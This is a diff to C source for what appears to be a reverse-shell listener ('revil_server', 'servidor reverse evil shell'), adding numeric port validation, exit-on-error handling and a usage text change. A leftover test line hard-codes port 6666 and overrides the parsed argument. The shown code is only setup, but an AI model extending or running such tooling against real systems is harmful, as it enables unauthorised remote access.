@@ -2,7 +2,6 @@
 
 int main(int argc, char *argv[]){
   /* Registrando rutina manejadora de señales */
-
   struct sigaction sa_sigint;
   struct sigaction sa_sigpipe;
 
@@ -11,15 +10,29 @@ int main(int argc, char *argv[]){
   if(sigaction(SIGINT, &sa_sigint, NULL) == -1)
   {
     printf("No se pudo registrar el manejador para Ctrl-C\n");
+    exit(-1);
   }
   sa_sigpipe.sa_handler = sig_handler;
   sa_sigpipe.sa_flags = SA_RESTART;
   if(sigaction(SIGPIPE, &sa_sigpipe, NULL) == -1)
   {
     printf("No se pudo registrar el manejador para SIGPIPE\n");
+    exit(-1);
   }
   
-  puerto = 6666;
+  /* Validación de parámetros */
+  if(argc != 2){
+    usage();
+    exit(-1);
+  }
+  if (!es_numero(argv[1]))
+  {
+    printf("[*] Mal argumento: El puerto debe ser numérico.\n");
+    exit(-1);
+  }
+  puerto = atoi(argv[1]);
+  puerto = 6666; // << -- Test
+  
   printf("\nIniciando servidor reverse evil shell...\n");
   socket_des = crear_socket_servidor(puerto);
   if (socket_des == -1 )
@@ -97,7 +110,7 @@ void sig_handler(int signal)
 void usage(void)
 {
   printf("uso:\nrevil_server [puerto]\n");
-  printf("[puerto]: Es el puerto por el que el servidor escuchará.\n");
+  printf("[puerto]: Es el puerto de escucha del servidor.\n");
 }
 
 void whoiam(void)
@@ -111,4 +124,15 @@ void whoiam(void)
       printf("Dirección IP del servidor %s\n", inet_ntoa(*((struct in_addr *)he->h_addr)));
     }
   }
+}
+
+int es_numero(char *valor)
+{
+  int i;
+  for(i = 0; valor[i] != '\0'; i++)
+  {
+    if(!isdigit(valor[i]))
+      return 0;
+  }
+  return 1;
 }
